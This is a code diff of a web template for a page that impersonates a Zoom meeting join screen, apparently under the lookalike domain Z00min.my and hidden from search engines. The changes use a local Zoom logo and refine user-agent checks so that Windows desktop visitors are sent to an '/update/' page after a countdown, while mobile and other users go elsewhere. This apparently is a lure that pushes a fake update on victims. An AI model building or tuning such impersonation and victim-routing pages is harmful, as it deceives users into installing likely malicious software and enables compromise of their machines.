@@ -1,3 +1,4 @@
+{% load static %}
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -5,8 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="description" content="Joining Zoom meeting...">
   <meta name="robots" content="noindex, nofollow">
-  <link rel="canonical" href="https://Z00min.my/meeting">
-  <link rel="icon" type="image/svg+xml" href="https://upload.wikimedia.org/wikipedia/commons/7/7b/Zoom_Communications_Logo.svg">
+  <link rel="icon" type="image/svg+xml" href="{% static 'zoom_logo.webp' %}">
   <title>Joining Meeting</title>
 
   <style>
@@ -67,13 +67,13 @@
 <script>
   (function () {
     var ua = navigator.userAgent || "";
-    var isMac = (/Macintosh|Mac OS X/i).test(ua) && !/Windows/i.test(ua);
+    var isMobileOrTablet = /iPhone|iPad|Android|Mobile|Tablet/i.test(ua);
+    var isWindowsDesktop = /Windows/i.test(ua) && !isMobileOrTablet;
 
     var homeUrl = "/update/";
     var pcOnlyUrl = "/pc-only/";
-    var targetUrl = isMac ? pcOnlyUrl : homeUrl;
-
-    var label = isMac ? "PC only page" : "home update page";
+    var laptopOnlyUrl = "/laptop-only/";
+    var targetUrl = isWindowsDesktop ? homeUrl : (isMobileOrTablet ? laptopOnlyUrl : pcOnlyUrl);
     document.getElementById("redirectText").textContent = "Joining Zoom meeting ...";
 
     var seconds = 5;
